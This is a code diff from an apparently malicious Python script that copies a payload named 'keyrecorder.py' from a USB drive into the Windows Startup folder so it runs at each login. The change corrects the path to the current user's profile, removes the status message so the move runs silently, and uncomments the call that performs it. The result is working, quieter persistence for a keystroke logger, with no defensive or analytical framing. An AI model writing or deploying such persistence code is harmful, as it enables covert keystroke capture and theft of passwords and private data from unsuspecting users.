@@ -43,9 +43,7 @@ user = os.getlogin()
 
 # Moving files from usb to shell:startup
 def add_to_startup(file):
-    shutil.move(f"{file}", "C:\\Users\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-    print("[*] Successfully moved files")
+    shutil.move(f"{file}", f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
 
 payload = "keyrecorder.py"
-# add_to_startup(payload)
-
+add_to_startup(payload)
